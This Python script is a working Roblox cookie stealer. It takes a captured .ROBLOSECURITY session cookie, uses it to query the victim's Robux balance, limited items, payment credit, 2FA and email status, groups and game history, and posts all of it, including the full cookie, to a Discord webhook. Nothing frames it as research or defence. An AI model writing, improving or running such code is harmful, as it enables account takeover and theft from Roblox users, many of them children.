import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone

class RobloxSession:
    def __init__(self, roblosecurity_cookie):
        self.session = requests.Session()
        # Ensure cookie is bound properly to the Roblox domain
        self.session.cookies.set(".ROBLOSECURITY", roblosecurity_cookie, domain=".roblox.com")
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        })
        self.csrf_token = None
        self._refresh_csrf()

    def _refresh_csrf(self):
        try:
            r = self.session.post("https://auth.roblox.com/v2/logout", timeout=10)
            token = r.headers.get("x-csrf-token")
            if token:
                self.csrf_token = token
                self.session.headers["X-CSRF-TOKEN"] = token
        except Exception:
            pass

    def request(self, method, url, **kwargs):
        resp = self.session.request(method, url, timeout=10, **kwargs)
        if resp.status_code == 403 and "x-csrf-token" in resp.headers:
            new_token = resp.headers["x-csrf-token"]
            self.csrf_token = new_token
            self.session.headers["X-CSRF-TOKEN"] = new_token
            resp = self.session.request(method, url, timeout=10, **kwargs)
        return resp

    def whoami(self):
        r = self.request("GET", "https://users.roblox.com/v1/users/authenticated")
        return r

def main():
    try:
        print("DEBUG: Python Extractor started", file=sys.stderr)
        
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No sys.argv[1] provided", file=sys.stderr)
            sys.exit(1)
        
        raw_arg = sys.argv[1]
        try:
            decoded_script = base64.b64decode(raw_arg).decode('utf-8', errors='ignore')
        except Exception:
            decoded_script = raw_arg

        roblosecurity = decoded_script.strip()
        cookie_match = re.search(r'(_\\?\|WARNING:[^"\']+)', roblosecurity)
        if cookie_match:
            roblosecurity = cookie_match.group(1)

        roblosecurity = roblosecurity.replace('\\|', '|').replace('\\"', '"')
        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'')

        print(f"DEBUG: Processed cookie length: {len(roblosecurity)}, Starts with: {roblosecurity[:15]}...", file=sys.stderr)

        # Initialize authenticated session client
        client = RobloxSession(roblosecurity)

        # Authenticated check
        auth_res = client.whoami()
        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)

        if auth_res.status_code != 200:
            print(f"DEBUG RESPONSE: {auth_res.text}", file=sys.stderr)
            sys.exit(1)

        auth_data = auth_res.json()
        user_id = auth_data.get("id")
        username = auth_data.get("name", "Unknown")
        display_name = auth_data.get("displayName", username)

        if not user_id:
            sys.exit(1)

        # --- Fetchers using the robust client session ---
        def get_user_info():
            return client.request("GET", f"https://users.roblox.com/v1/users/{user_id}").json()

        def get_robux():
            r = client.request("GET", f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
            return r.get("robux", 0)

        def get_pending():
            r = client.request(
                "GET",
                f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
                params={"transactionType": "summary", "timeFrame": "Year"}
            ).json()
            return r.get("pendingRobuxTotal", 0)

        def get_limiteds():
            limiteds = []
            cursor = ""
            while True:
                params = {"limit": 100}
                if cursor:
                    params["cursor"] = cursor
                r = client.request(
                    "GET",
                    f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
                    params=params
                ).json()
                for item in r.get("data", []):
                    limiteds.append(item.get("recentAveragePrice", 0))
                cursor = r.get("nextPageCursor")
                if not cursor:
                    break
            return limiteds

        def get_premium():
            r = client.request("GET", f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
            return r.json() == True

        def get_groups():
            r = client.request("GET", f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").json()
            groups = r.get("data", [])
            owned = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
            return len(groups), owned

        def get_games_developer():
            r = client.request("GET", f"https://develop.roblox.com/v1/user/universes?userId={user_id}").json()
            return len(r.get("data", [])) > 0

        def get_account_settings():
            r = client.request("GET", "https://accountsettings.roblox.com/v1/email").json()
            email_verified = r.get("verified", False)
            r2 = client.request("GET", "https://twostepverification.roblox.com/v1/metadata").json()
            twofa = r2.get("twoStepVerificationEnabled", False)
            return email_verified, twofa

        def get_credit():
            r = client.request("GET", "https://billing.roblox.com/v1/credit").json()
            return r.get("balance", 0), r.get("currencyType", "Unknown")

        def check_played(universe_id):
            cursor = ""
            while True:
                r = client.request(
                    "GET",
                    f"https://badges.roblox.com/v1/users/{user_id}/badges",
                    params={"limit": 100, "cursor": cursor}
                ).json()
                for badge in r.get("data", []):
                    if badge.get("awardingUniverse", {}).get("id") == universe_id:
                        return True
                cursor = r.get("nextPageCursor")
                if not cursor:
                    return False

        # --- Gather Data ---
        user        = get_user_info()
        created     = user.get("created", "")
        age_days    = (datetime.now(timezone.utc) - datetime.fromisoformat(
                        created.replace("Z", "+00:00"))).days if created else 0

        robux       = get_robux()
        pending     = get_pending()
        limiteds    = get_limiteds()
        rap         = sum(limiteds)
        lim_count   = len(limiteds)
        premium     = get_premium()
        group_count, owned = get_groups()
        developer   = get_games_developer()
        email_ver, twofa = get_account_settings()
        credit, currency = get_credit()

        adopt_me    = check_played(383310974)
        mm2         = check_played(142823291)
        ps99        = check_played(3259657279)

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
        full_cookie_display = f"```text\n{roblosecurity}\n```"

        payload = {
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [{
                "title": f"👑 [{display_name} | 13+]",
                "description": (
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | "
                    f"**[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**"
                ),
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {
                        "name": "👤 Username",
                        "value": f"`{username}`",
                        "inline": True
                    },
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {
                        "name": "📈 Account Stats",
                        "value": (
                            f"• Age: `{age_days} Days`\n"
                            f"• Developer: `{developer}`\n"
                            f"• Group Members: `{group_count}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "🪙 Robux",
                        "value": (
                            f"• Balance: `{robux:,} R$`\n"
                            f"• Pending: `{pending:,} R$`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "📦 Limiteds",
                        "value": (
                            f"• RAP: `{rap:,} R$`\n"
                            f"• Count: `{lim_count}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "💳 Payments",
                        "value": f"• Credit: `{credit:.2f} {currency}`",
                        "inline": True
                    },
                    {
                        "name": "🎮 Games Played",
                        "value": (
                            f"• Adopt Me: `{adopt_me}`\n"
                            f"• MM2: `{mm2}`\n"
                            f"• PS99: `{ps99}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "⚙️ Settings",
                        "value": (
                            f"• Email Verified: `{email_ver}`\n"
                            f"• 2FA: `{twofa}`"
                        ),
                        "inline": True
                    },
                    {
                        "name": "⭐ Premium",
                        "value": f"`{premium}`",
                        "inline": True
                    },
                    {
                        "name": "👥 Groups",
                        "value": (
                            f"• Owned: `{owned}`\n"
                            f"• Joined: `{group_count}`"
                        ),
                        "inline": True
                    },
                    {"name": "\u200b", "value": "\u200b", "inline": True},
                    {
                        "name": "🔑 Full Captured Cookie / Payload",
                        "value": full_cookie_display,
                        "inline": False
                    }
                ],
                "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }

        # Dispatch to Cloudflare Worker webhook
        r = requests.post(webhook_url, json=payload, timeout=10)
        if r.status_code in (200, 204):
            print("DEBUG: Embed sent successfully!", file=sys.stderr)
        else:
            print(f"DEBUG: Failed to send embed: {r.status_code} - {r.text}", file=sys.stderr)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
